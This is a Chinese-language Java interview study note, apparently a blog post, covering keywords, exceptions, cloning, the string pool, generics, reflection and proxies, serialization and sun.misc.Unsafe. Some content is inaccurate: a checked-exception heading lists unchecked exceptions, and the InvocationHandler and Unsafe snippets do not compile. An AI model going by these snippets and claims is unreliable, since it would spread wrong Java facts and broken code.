title="访问控制"></a>访问控制</h2></li><li>private</li><li>protected    </li><li>public<h2 id="类，方法，变量修饰符"><a href="#类，方法，变量修饰符" class="headerlink" title="类，方法，变量修饰符"></a>类，方法，变量修饰符</h2></li><li>class</li><li>new</li><li>abstract </li><li>extends</li><li>static:</li><li>final </li><li>implements</li><li>interface</li><li>synchronized</li><li>enum</li><li>native</li><li>volatile</li></ul><ol><li><p>static:static 修饰的变量和方法可以被类的所有实例共享，无论一个类创建了多少个对象，它们都共享同一份静态变量。也就是说，静态变量只会被分配一次内存，即使创建多个对象，这样可以节省内存。</p></li><li><p>静态方法只允许访问静态成员（即静态成员变量和静态方法），不允许访问实例成员（即实例成员变量和实例方法），而实例方法不存在这个限制。</p></li><li><p>【为什么不能调用非静态成员】：在类加载的时候就会分配内存，非静态成员需要实例化后才能有效访问</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2></li></ol><ul><li>try</li><li>catch</li><li>throw</li><li>throws</li><li>finally<ul><li>当在 try 块或 catch 块中遇到 return 语句时，finally 语句块将在方法返回之前被执行。</li></ul></li></ul><h2 id="重写-override-和-重载-overload"><a href="#重写-override-和-重载-overload" class="headerlink" title="重写 override 和 重载 overload"></a>重写 override 和 重载 overload</h2><ul><li>override是子类重写父类方法，参数需要一样</li><li>overload是在一个类中重载的某个方法</li><li>构造方法可以背重载，不可以重写</li></ul><h2 id="接口和抽象类有什么共同点和区别？"><a href="#接口和抽象类有什么共同点和区别？" class="headerlink" title="接口和抽象类有什么共同点和区别？"></a>接口和抽象类有什么共同点和区别？</h2><p>共同点：都不能被实例化。都可以包含抽象方法。都可以有默认实现的方法（Java 8 可以用 default 关键字在接口中定义默认方法）。</p><p>区别：接口主要用于对类的行为进行约束，你实现了某个接口就具有了对应的行为。抽象类主要用于代码复用，强调的是所属关系。一个类只能继承一个类，但是可以实现多个接口。接口中的成员变量只能是 public static final 类型的，不能被修改且必须有初始值，而抽象类的成员变量默认 default，可在子类中被重新定义，也可被重新赋值</p><h2 id="深拷贝与浅拷贝-引用拷贝"><a href="#深拷贝与浅拷贝-引用拷贝" class="headerlink" title="深拷贝与浅拷贝/引用拷贝"></a>深拷贝与浅拷贝/引用拷贝</h2><ul><li>深拷贝：完整复制某个对象，包括这个对象中的内部对象，都是不同的对象</li><li>浅拷贝：在堆上创建一个新对象，这个新对象与原对象使用的是同一个内部对象<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Person <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Person person = (Person) <span class="keyword">super</span>.clone();</span><br><span class="line">        person.setAddress(person.getAddress().clone());</span><br><span class="line">        <span class="comment">//加入这一行，内部的address对象也进行拷贝，本质上是堆上的另外一个对象。</span></span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Object：基类"><a href="#Object：基类" class="headerlink" title="Object：基类"></a>Object：基类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//native 方法，用于返回当前运行时对象的 Class 对象，使用了 final 关键字修饰，故不允许子类重写。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> Class&lt;?&gt; getClass()</span><br><span class="line"><span class="comment">//native 方法，用于返回对象的哈希码，主要使用在哈希表中，比如 JDK 中的HashMap。获取哈希码（int 整数），也称为散列码，也可以比较两个对象是否相等。两个对象的hashCode 值相等并不代表两个对象就相等：可能发生冲突</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//用于比较 2 个对象的内存地址是否相等，String 类对该方法进行了重写以用于比较字符串的值是否相等。</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function"><span class="comment">//native 方法，用于创建并返回当前对象的一份拷贝。</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException</span></span><br><span class="line"><span class="function"><span class="comment">//返回类的名字实例的哈希码的 16 进制的字符串。建议 Object 所有的子类都重写这个方法。</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//native 方法，并且不能重写。唤醒一个在此对象监视器上等待的线程(监视器相当于就是锁的概念)。如果有多个线程在等待只会任意唤醒一个。</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//native 方法，并且不能重写。跟 notify 一样，唯一的区别就是会唤醒在此对象监视器上等待的所有线程，而不是一个线程。</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">notifyAll</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//native方法，并且不能重写。暂停线程的执行。注意：sleep 方法没有释放锁，而 wait 方法释放了锁 ，timeout 是等待时间。</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException</span></span><br><span class="line"><span class="function"><span class="comment">//多了 nanos 参数，这个参数表示额外时间（以纳秒为单位，范围是 0-999999）。 所以超时的时间还需要加上 nanos 纳秒。。</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout, <span class="keyword">int</span> nanos)</span> <span class="keyword">throws</span> InterruptedException</span></span><br><span class="line"><span class="function"><span class="comment">//跟之前的2个wait方法一样，只不过该方法一直等待，没有超时时间这个概念</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span></span><br><span class="line"><span class="function"><span class="comment">//实例被垃圾回收器回收的时候触发的操作</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123; &#125;</span><br></pre></td></tr></table></figure><h2 id="String-StringBuffer-StringBuilder"><a href="#String-StringBuffer-StringBuilder" class="headerlink" title="String  StringBuffer StringBuilder"></a>String  StringBuffer StringBuilder</h2><ul><li>String类不可变：创建时，采用final的字符数组表示字符串了,final char [],(java9以后用的byte[])</li><li><strong>StringBuilder</strong> 与 <strong>StringBuffer</strong>都继承自 <strong>AbstractStringBuilder</strong> 类，也是使用字符数组保存字符串，不过没有使用 final 和 private 关键字修饰，最关键的是这个 AbstractStringBuilder 类还提供了很多修改字符串的方法比如 append 方法。</li></ul><h2 id="字符串常量池"><a href="#字符串常量池" class="headerlink" title="字符串常量池"></a>字符串常量池</h2><p>是 JVM 为了提升性能和减少内存消耗针对字符串（String 类）专门开辟的一块区域，主要目的是为了<strong>避免字符串的重复创建。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在堆中创建字符串对象”ab“</span></span><br><span class="line"><span class="comment">// 将字符串对象”ab“的引用保存在字符串常量池中</span></span><br><span class="line">String aa = <span class="string">"ab"</span>;</span><br><span class="line"><span class="comment">// 直接返回字符串常量池中字符串对象”ab“的引用</span></span><br><span class="line">String bb = <span class="string">"ab"</span>;</span><br><span class="line">System.out.println(aa==bb);<span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>【面试题】<code>String s1 = new String(&quot;abc&quot;);</code>这句话创建了几个字符串对象？</p><ul><li>一个或两个：</li><li>一个的情况，abc在字符串常量池里，仅需要abc的引用创建s1</li><li>两个的情况，abc不存在常量池里，要先创建abc，再将其引用创建s1</li></ul><p>【面试题】手动将某字符串加入字符串常量池用什么方法</p><ul><li>String.intern()</li><li>将指定的字符串对象的引用保存在字符串常量池中，可以简单分为两种情况：<ul><li>如果字符串常量池中保存了对应的字符串对象的引用，就直接返回该引用。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在堆中创建字符串对象”Java“</span></span><br><span class="line"><span class="comment">// 将字符串对象”Java“的引用保存在字符串常量池中</span></span><br><span class="line">String s1 = <span class="string">"Java"</span>;</span><br><span class="line"><span class="comment">// 直接返回字符串常量池中字符串对象”Java“对应的引用</span></span><br><span class="line">String s2 = s1.intern();</span><br><span class="line"><span class="comment">// 会在堆中在单独创建一个字符串对象</span></span><br><span class="line">String s3 = <span class="keyword">new</span> String(<span class="string">"Java"</span>);</span><br><span class="line"><span class="comment">// 直接返回字符串常量池中字符串对象”Java“对应的引用</span></span><br><span class="line">String s4 = s3.intern();</span><br><span class="line"><span class="comment">// s1 和 s2 指向的是堆中的同一个对象</span></span><br><span class="line">System.out.println(s1 == s2); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// s3 和 s4 指向的是堆中不同的对象</span></span><br><span class="line">System.out.println(s3 == s4); <span class="comment">// false</span></span><br><span class="line"><span class="comment">// s1 和 s4 指向的是堆中的同一个对象</span></span><br><span class="line">System.out.println(s1 == s4); <span class="comment">//true</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p>【面试题】字符串加号操作 str + str</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">"str"</span>;<span class="comment">//创建了一个字符串常量 "str"，它会存储在常量池中</span></span><br><span class="line">String str2 = <span class="string">"ing"</span>;</span><br><span class="line">String str3 = <span class="string">"str"</span> + <span class="string">"ing"</span>;<span class="comment">//这里的 "str" 和 "ing" 都是字符串字面量，它们会在编译时就被合并成一个新的字符串常量 "string"，然后存储在常量池中。</span></span><br><span class="line">String str4 = str1 + str2;<span class="comment">//这里使用了变量 str1 和 str2 进行字符串拼接，这是在运行时进行的。因此，新的字符串对象 "string" 会在堆内存中创建，而不是常量池</span></span><br><span class="line">String str5 = <span class="string">"string"</span>;</span><br><span class="line">System.out.println(str3 == str4);<span class="comment">//false</span></span><br><span class="line">System.out.println(str3 == str5);<span class="comment">//true</span></span><br><span class="line">System.out.println(str4 == str5);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><h2 id="Exception-和-Error（两者继承Thorwable）"><a href="#Exception-和-Error（两者继承Thorwable）" class="headerlink" title="Exception 和 Error（两者继承Thorwable）"></a>Exception 和 Error（两者继承Thorwable）</h2><ul><li><strong>Exception</strong> ：程序本身可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为 Checked Exception (受检查异常，必须处理) 和 Unchecked Exception (不受检查异常，可以不处理)。</li><li><strong>Error</strong>：Error 属于程序无法处理的错误 ，jvm一般会选择线程终止。例如 Java 虚拟机运行错误（Virtual MachineError）、虚拟机内存不够错误(OutOfMemoryError)、类定义错误（NoClassDefFoundError）等 。这些异常发生时，Java 虚拟机（JVM）一般会选择线程终止。</li></ul><h3 id="Checkable-Exception-受检查异常，必须用catch或者throw捕获"><a href="#Checkable-Exception-受检查异常，必须用catch或者throw捕获" class="headerlink" title="Checkable Exception 受检查异常，必须用catch或者throw捕获"></a>Checkable Exception 受检查异常，必须用catch或者throw捕获</h3><p>除了RuntimeException及其子类以外（下列），其他的Exception类及其子类都属于受检查异常</p><ul><li>NullPointerException(空指针错误)</li><li>IllegalArgumentException(参数错误比如方法入参类型错误)</li><li>NumberFormatException（字符串转换为数字格式错误，IllegalArgumentException的子类）</li><li>ArrayIndexOutOfBoundsException（数组越界错误）</li><li>ClassCastException（类型转换错误）</li><li>ArithmeticException（算术错误）</li><li>SecurityException （安全错误比如权限不够）</li><li>UnsupportedOperationException(不支持的操作错误比如重复创建同一用户)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用throws关键字声明可能抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> <span class="keyword">throws</span> MyException </span>&#123;</span><br><span class="line">        <span class="comment">// 在方法内部发现异常情况</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="comment">/* some condition */</span>) &#123;</span><br><span class="line">            <span class="comment">// 抛出自定义异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MyException(<span class="string">"Something went wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">catch</span>(MyException e)&#123;</span><br><span class="line">          e.printStackTrace(); <span class="comment">//在控制台上打印 Throwable 对象封装的异常信息</span></span><br><span class="line">          e.getMessage();<span class="comment">// 返回异常发生时的简要描述</span></span><br><span class="line">          e.toString();<span class="comment">// 返回异常发生时的详细信息</span></span><br><span class="line">          e.getLocalizedMessage();<span class="comment">//返回异常对象的本地化信息。</span></span><br><span class="line">      &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型-Generics-对比CPP的template"><a href="#泛型-Generics-对比CPP的template" class="headerlink" title="泛型 Generics //对比CPP的template"></a>泛型 Generics //对比CPP的template</h2><p>相同点：</p><ul><li><strong>参数化类型</strong>：两者都允许你定义可以接受不特定类型的数据结构或算法，从而提高代码的复用性和灵活性。</li><li><strong>类型安全</strong>：Java 的泛型和 C++ 的模板都<strong>在编译时进行类型检查</strong>，确保类型的一致性。</li><li><strong>支持容器类</strong>：在两者中，可以创建可以容纳任何类型的容器类（例如，List、Set、Map 等）。</li></ul><p>不同点：</p><ul><li><strong>实现方式</strong>：<ul><li>Java 泛型是通过擦除（type erasure）来实现的。在编译时，泛型类型信息会被擦除，编译器会将泛型代码转化成非泛型的代码。这意味着在运行时，不会保留关于泛型类型的信息。这也是为什么在 Java 中不能直接创建泛型数组的原因。</li><li>C++ 模板是通过编译器在编译时进行代码生成，每次使用模板时，都会根据模板参数生成对应的代码。这使得 C++ 模板可以实现更为复杂和灵活的类型推断。</li></ul></li><li><strong>语法</strong>：<br>Java 泛型使用<t>来表示泛型类型，可以在类、接口、方法等级别使用泛型。<br>C++ 模板使用<typename t>或者<class t>来声明模板参数，可以在类、函数等级别使用模板。</class></typename></t></li><li><strong>泛型的通配符</strong>：<br>Java 的泛型可以使用通配符（wildcards）来表示不确定的类型。例如：List&lt;?&gt;表示一个不确定类型的 List。<br>C++ 模板可以通过模板特化来处理特定的类型。</li><li><strong>模板元编程</strong>：<br>C++ 的模板系统支持模板元编程，这意味着可以在编译时进行计算和逻辑操作，从而实现更为复杂的类型处理。</li><li><strong>依赖</strong>：<br>Java 的泛型不依赖于运行时类型信息（RTTI）。<br>C++ 的模板依赖于编译时类型信息（CTTI）。</li></ul><h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><ul><li>代理机制</li></ul><p><strong>使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</strong></p><ul><li>动态代理更加灵活，不需要必须实现接口，可以直接代理实现类，并且可以不需要针对每个目标类都创建一个代理类。</li><li>静态代理中，接口一旦新增加方法，目标对象和代理对象都要进行修改，这是非常麻烦的！</li><li>JVM 层面：静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。而动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class alunbarClass = TargetObject.class; <span class="comment">//知道目的类名为TargetObject，直接获取</span></span><br><span class="line">Class alunbarClass1 = Class.forName(<span class="string">"cn.javaguide.TargetObject"</span>);<span class="comment">//通过类的全路径获取</span></span><br><span class="line">TargetObject instance = <span class="keyword">new</span> TargetObject();<span class="comment">//通过实例获取</span></span><br><span class="line">Class alunbarClass2 = instance.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过类加载器进行全路径的loadclass</span></span><br><span class="line">ClassLoader.getSystemClassLoader().loadClass(<span class="string">"cn.javaguide.TargetObject"</span>);</span><br></pre></td></tr></table></figure><ul><li><p>静态代理<br>可以在代理类中增加方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SmsService</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">send</span><span class="params">(String message)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title">SmsService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">send</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmsProxy</span> <span class="keyword">implements</span> <span class="title">SmsService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService smsService;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SmsProxy</span><span class="params">(SmsService smsService)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.smsService = smsService;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">SmsService smsService = <span class="keyword">new</span> SmsServiceImpl();</span><br><span class="line">SmsProxy smsProxy = <span class="keyword">new</span> SmsProxy(smsService);</span><br></pre></td></tr></table></figure></li><li><p>动态代理：JDK 动态代理、CGLIB 动态代理</p><ul><li>InvocationHandler 接口和 Proxy 类</li><li>还必须需要实现InvocationHandler 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">//当你使用代理对象调用方法的时候实际会调用到这个方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h2><p>数据从外部存储和内存之间进出的过程就是IO。</p><h3 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h3><p>如果我们不知道编码类型的话，使用字节流的过程中很容易出现乱码问题。</p><h3 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h3><p>字符流是由 Java 虚拟机将字节转换得到的，这个过程还算是比较耗时</p><h2 id="序列化-Protobuf，Hessian，Kyro"><a href="#序列化-Protobuf，Hessian，Kyro" class="headerlink" title="序列化 Protobuf，Hessian，Kyro"></a>序列化 Protobuf，Hessian，Kyro</h2><ul><li>transient 阻止实例中那些用此关键字修饰的的变量序列化；</li><li>当对象被反序列化时，被 transient 修饰的变量值不会被持久化和恢复。</li><li>transient 只能修饰变量，不能修饰类和方法。</li><li>static 变量因为不属于任何对象(Object)，所以无论有没有 transient 关键字修饰，均不会被序列化。</li></ul><h2 id="sun-misc-Unsafe类-并发工具类的组件，一个直接操作内存空间的类。"><a href="#sun-misc-Unsafe类-并发工具类的组件，一个直接操作内存空间的类。" class="headerlink" title="sun.misc.Unsafe类:并发工具类的组件，一个直接操作内存空间的类。"></a>sun.misc.Unsafe类:并发工具类的组件，一个直接操作内存空间的类。</h2><p>主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升 Java 运行效率、增强 Java 语言底层资源操作能力方面起到了很大的作用。</p><ul><li>Unsafe中提供的方法需要依赖native方法，Java 代码中只是声明方法头，具体的实现则交给本地代码</li></ul><h3 id="堆外内存"><a href="#堆外内存" class="headerlink" title="堆外内存"></a>堆外内存</h3><p>使用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分配新的本地空间</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">long</span> <span class="title">allocateMemory</span><span class="params">(<span class="keyword">long</span> bytes)</span></span>;</span><br><span class="line"><span class="comment">//重新调整内存空间的大小</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">long</span> <span class="title">reallocateMemory</span><span class="params">(<span class="keyword">long</span> address, <span class="keyword">long</span> bytes)</span></span>;</span><br><span class="line"><span class="comment">//将内存设置为指定值</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">(Object o, <span class="keyword">long</span> offset, <span class="keyword">long</span> bytes, <span class="keyword">byte</span> value)</span></span>;</span><br><span class="line"><span class="comment">//内存拷贝</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">copyMemory</span><span class="params">(Object srcBase, <span class="keyword">long</span> srcOffset,Object destBase, <span class="keyword">long</span> destOffset,<span class="keyword">long</span> bytes)</span></span>;</span><br><span class="line"><span class="comment">//清除内存</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">freeMemory</span><span class="params">(<span class="keyword">long</span> address)</span></span>;</span><br></pre></td></tr></table></figure><p>这种方式分配<strong>堆外内存</strong>，是无法进行垃圾回收的，需要我们把这些内存当做一种资源去手动调用freeMemory方法进行释放，否则会产生内存泄漏。通用的操作内存方式是在try中执行对内存的操作，最终在finally块中进行内存释放。</p><h3 id="【面试题】为什么要用堆外内存"><a href="#【面试题】为什么要用堆外内存" class="headerlink" title="【面试题】为什么要用堆外内存"></a>【面试题】为什么要用堆外内存</h3><ul><li>对GC停顿的改善。由于堆外内存是直接受操作系统管理而不是 JVM，所以当我们使用堆外内存时，即可保持较小的堆内内存规模。从而在 GC 时减少回收停顿对于应用的影响。</li><li>提升程序 I/O 操作的性能。通常在 I/O 通信过程中，会存在堆内内存到堆外内存的数据拷贝操作，对于需要频繁进行内存间数据拷贝且生命周期较短的暂存数据，都建议存储到堆外内存。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单例模式的应用：</span></span><br><span class="line"><span class="comment">// 利用反射获得 Unsafe 类中已经实例化完成的单例对象 theUnsafe.</span></span><br><span class="line">Unsafe unsafe = Unsafe.reflectGetUnsafe();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="keyword">long</span> maddr = unsafe.allocateMemory(<span class="number">1024</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(OutOfMemoryError e)&#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">  <span class="keyword">throw</span> e;</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">  unsafe.freeMomory(maddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DirectByteBuffer"><a href="#DirectByteBuffer" class="headerlink" title="DirectByteBuffer"></a>DirectByteBuffer</h3><ul><li>实现堆外内存的一个重要类，通常用在通信过程中做缓冲池，在NIO中使用广泛。</li><li>对于堆外内存的创建、使用、销毁等逻辑均由 Unsafe 提供的堆外内存 API 来实现</li></ul><h3 id="内存屏障-Memory-Barrier-组织指令重排序"><a href="#内存屏障-Memory-Barrier-组织指令重排序" class="headerlink" title="内存屏障 Memory Barrier:组织指令重排序"></a>内存屏障 Memory Barrier:组织指令重排序</h3><p>阻止屏障两边的<strong>指令重排序</strong>从而避免编译器和硬件的不正确优化情况</p><ul><li>屏蔽了操作系统底层的差异，允许在代码中定义、并统一由 JVM 来生成内存屏障指令，来实现内存屏障的功能<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存屏障，禁止load操作重排序。屏障前的load操作不能被重排序到屏障后，屏障后的load操作不能被重排序到屏障前</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">loadFence</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//内存屏障，禁止store操作重排序。屏障前的store操作不能被重排序到屏障后，屏障后的store操作不能被重排序到屏障前</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">storeFence</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//内存屏障，禁止load、store操作重排序</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">fullFence</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li></ul><p>运行中的线程不是直接读取主内存中的变量的，只能操作自己工作内存中的变量，然后同步到主内存中，并且线程的工作内存是不能共享的。上面的图中的流程就是子线程借助于主内存，将修改后的结果同步给了主线程，进而修改主线程中的工作空间，跳出循环。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
